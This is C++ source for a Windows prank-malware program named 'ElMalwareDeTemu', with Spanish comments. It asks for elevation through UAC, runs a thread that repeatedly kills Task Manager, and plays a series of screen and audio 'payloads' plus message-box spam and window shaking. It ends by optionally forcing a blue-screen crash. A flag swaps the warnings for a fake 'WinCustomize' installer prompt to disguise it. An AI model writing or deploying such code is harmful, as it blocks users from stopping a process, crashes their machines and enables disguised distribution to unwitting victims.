#include <windows.h>
#include <wingdi.h>
#include <mmsystem.h>
#include <math.h>
#include <stdlib.h>
#include <iostream>
#include <tlhelp32.h>
#include "resources.h"
#include <wbemidl.h>
#include <comdef.h>
#include "payloads.cpp"
#include "byewindows.cpp"



// ─────────────────────────────────────────────────────────────
// DETECCIÓN Y BLOQUEO DEL ADMINISTRADOR DE TAREAS
// ─────────────────────────────────────────────────────────────
bool estaAbierto(const wchar_t* nombre) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(entry);
    bool encontrado = false;
    if (Process32FirstW(snap, &entry)) {
        do {
            if (wcscmp(entry.szExeFile, nombre) == 0) {
                encontrado = true;
                break;
            }
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return encontrado;
}

DWORD WINAPI MostrarMensaje(LPVOID) {
    MessageBoxW(NULL,
        L"N̵̛̪͉̈̎̚͘͜ó̸̝͕̰͕̹̪̬͇̝̔̇̍̑̽̍̾̎͠͝͝ ̸̰̬̘͈̪͎̿̀́͒̅͗̆̎͛͠ͅp̷̨̟̲͙͚̲̑̔̋̋͜u̴̺̻͈̣̬͈̩̫̤͖̙̙̼̽͌̂̃̂́͂̇͌͜͝ě̸̝̓͌̚͝͠ḋ̵̖̩͔̖̭̠͓̮́̐̽̑̇͌͒̉̕̕è̴͉͙̤̟̦̮̮͑̏̑̈́̋͘͜͝s̶̛̺̲̔̑ ̷̡̮̪̦̫̗̝̥̈́͌́͐͒̔̄̓̊͛́͘c̶̫̼͚̩̘̝͈̗̾̿́̎̅́͗͌̊̋̌͘̚͠o̶̢̧̻̗͎̯͔̖̟̞̬̦͂͆͌̐̕̚̕ͅͅn̷̬̘̩̈́́̆̾͘t̶̜̪͍̯̬̃͋̎̒̀͘r̴̡̡̛̯̰͓̬̰̭̳̥̜̮͉͈͑̀͌͌̐͝ä̸͇͗͌̋̈̅̐̄̾͛̀̕͠͝ ̸̢̨̢̢̛̬̲̻̰͇̘̫̪̲̼̍̆̋̽̒̈́̈́͘͝m̵̨̢̜͈̩̞͙͕͒̔̊̿̉̽̓̈́̍i̴̡̛͇̽̉̍͑̔̍͝͝",
        L"ElMalwareDeTemu - Ę̶̡̢̢̙̩̝͈̳̭̜͈̜̑͋̄̈́͆̆͗̑̄͘̕̕͠ͅR̷̢̧̭̱̗̲̫͎̮̪̬̮͊͜R̴͔̰̔̂̐̍̄Ỏ̷̧̜̙̯̓͒́̾͒Ṛ̴̥̻̺̩͓̘̮̦̠̆͗̀̆͆͛͑̉͆̓̕̕͝",
        MB_OK | MB_ICONERROR | MB_TOPMOST);
    return 0;
}

DWORD WINAPI TaskManagerWatcher(LPVOID) {
    bool estabaAbierto = false;
    bool mensajeMostrado = false;

    while (true) {
        bool abierto = estaAbierto(L"Taskmgr.exe");

        // Matar el proceso continuamente mientras esté abierto
        if (abierto) {
            system("taskkill /F /IM Taskmgr.exe >nul 2>&1");
        }

        // Mostrar el mensaje solo una vez por "evento de apertura"
        if (abierto && !estabaAbierto && !mensajeMostrado) {
            mensajeMostrado = true;
            HANDLE hMsg = CreateThread(NULL, 0, MostrarMensaje, NULL, 0, NULL);
            if (hMsg) CloseHandle(hMsg);
        }

        if (!abierto) mensajeMostrado = false;

        estabaAbierto = abierto;
        Sleep(150); // más rápido para cerrar antes de que se vea
    }
    return 0;
}
// ─────────────────────────────────────────────────────────────

void relaunchAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    SHELLEXECUTEINFOA sei = {};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_SHOWNORMAL;
    if (!ShellExecuteExA(&sei)) {
        MessageBoxA(NULL, "El usuario cancelo el UAC o no es admin.", "Error", MB_OK);
        ExitProcess(1);
    }
    ExitProcess(0);
}

bool isAdmin() {
    BOOL admin = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size))
            admin = elevation.TokenIsElevated;
        CloseHandle(token);
    }
    return admin;
}




// ─────────────────────────────────────────────────────────────
// WinMain: punto de entrada WinAPI (sin consola)
// ─────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    bool CrashPc = true;
    bool InstaladorFalso = false;
    HANDLE hWatcher = CreateThread(NULL, 0, TaskManagerWatcher, NULL, 0, NULL);

    if (!isAdmin()) relaunchAsAdmin();

    //nothing special
    if(!InstaladorFalso){
        int respuesta1 = MessageBoxA(NULL,
        "ADVERTENCIA esto es un malware podria afectar tu pc\n"
        "xd no se que poner\n"
        "Eso si. no te asustes. no hace nada aunque crashee",
        "ElMalwareDeTemu", MB_OKCANCEL | MB_ICONEXCLAMATION);
        if (respuesta1 != IDOK) return 0;

        int respuestaCrash = MessageBoxA(NULL,
        "PENULTIMA ADVERTENCIA\n\n"
        "quieres activar la opcion de pantallazo azul?\n"
        "'Si' es para activar\n"
        "'No' es para desactivar",
        "¿Activar BSOD?", MB_YESNO | MB_ICONQUESTION);

        CrashPc = (respuestaCrash == IDYES);

        int respuesta2 = MessageBoxA(NULL,
        "ULTIMA ALERTA. esto crashea tu pc\n"
        "Dale a Aceptar para probar mi creacion. peligrosaso.\n"
        "jiji",
        "ElMalwareDeTemu", MB_OKCANCEL | MB_ICONWARNING);
    if (respuesta2 != IDOK) return 0;
    }else{
        if(int respuesta1= MessageBoxA(NULL,"Para Proceder Con La Instalacion es recomendable que tenga cerrada todas las aplicaciones\n"
            "Proceder?",
            "WinCustomize",
             MB_OKCANCEL | MB_ICONQUESTION)!=IDOK) return 0;

    }

    // ── Iniciar watcher del Administrador de Tareas ──
    //HANDLE hWatcher = CreateThread(NULL, 0, TaskManagerWatcher, NULL, 0, NULL);

    RunPhase(18, AudioSequence1, Shader1, Payload1);
    //RunPhase(12, AudioSequence6, Shader3, Payload11);
    //RunPhase(10, AudioSequence3, Shader3, Payload10);
    RunPhase(12, AudioSequence2, Shader2, Payload2);
    RunPhase(12, AudioSequence3, Shader3, Payload3);
    RunPhase(13, AudioSequence4, Shader4, Payload4);
    RunPhase(15, AudioSequence5, Shader5, Payload5);
    RunPhase(13, AudioSequence2, Shader1, Payload6);
    RunPhase(13, AudioSequence7, Shader2, Payload7);
    RunPhase(10, AudioSequenceWhite, Shader5, Payload8);
    RunPhase(12, AudioSequence6, Shader3, Payload9);
    //RunPhase(12, AudioSequence6, Shader3, Payload9);
    RunPhase(12, AudioSequence1, Shader3, Payload10);
    RunPhase(12, AudioSequence3, Shader3, Payload11);
    RunPhase(12, AudioSequence2, Shader3, Payload12);
    RunPhase(12, AudioSequence8, Shader3, Payload13);
    RunPhase(12, AudioSequence5, Shader3, Payload14);
    RunPhase(12, AudioSequence8, Shader3, Payload15);
    RunPhase(12, AudioSequenceWhite, Shader3, Payload16);
    RunPhase(15, AudioSequence4, Shader2, Payload17);
    RunPhase(15, AudioSequence6, Shader2, Payload18);

    static AUDIO_PARAMS ap_extra = {8000, 8000 * 17, AudioSequence6};  // static para que viva todo el programa
    CreateThread(NULL, 0, AudioThread, &ap_extra, 0, NULL);

    // Lanzamos los efectos infinitos
    CreateThread(NULL, 0, WindowsCorruptionPayload, NULL, 0, NULL);    // temblor/corrupción ventanas
    CreateThread(NULL, 0, DesktopShakeThread,       NULL, 0, NULL);    // temblor fondo/live wallpaper
    CreateThread(NULL, 0, MessageBoxPayload,        NULL, 0, NULL);    // spam de MessageBox random

    Sleep(17000);  // espera los 17 segundos que pediste
    RunPhase(10,AudioSequence6,Shader3,Payload19);




    /*HANDLE hThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
        HDC hdc = GetDC(NULL);
        int t = 0;

        DWORD start = GetTickCount();
        while (GetTickCount() - start < 15000) {
            Payload16(t, hdc);
            t++;
            Sleep(40);
        }

        // ESTO NUNCA SE EJECUTA porque el while(true) es infinito
        // Pero si algún día quieres que termine, puedes poner una condición
        ReleaseDC(NULL, hdc);
        return 0;
    }, NULL, 0, NULL);
    Sleep(15000);*/
    //PlayWhiteNoise(10000);
    //RunPhase(10, AudioSequenceWhite, Shader3, Payload10);
    //RunPhase(15, AudioSequence3, Shader3, Payload11);

    if (CrashPc) forceBSOD();

    // ── Detener watcher y limpiar ──
    TerminateThread(hWatcher, 0);
    CloseHandle(hWatcher);

    free(g_Shader4Buf);
    g_Shader4Buf = NULL;

    MessageBoxA(NULL, "Finalizado con fines de pruebas\n"
        "xd. nose que poner", "ELMalwareDeTemu", MB_OK| MB_ICONINFORMATION);
    return 0;
}
//  g++ -g WinCustomize.cpp resource.o -o WinCustomize.exe -lgdi32 -luser32 -lwinmm -lmsimg32 -lntdll -lshell32 -mwindows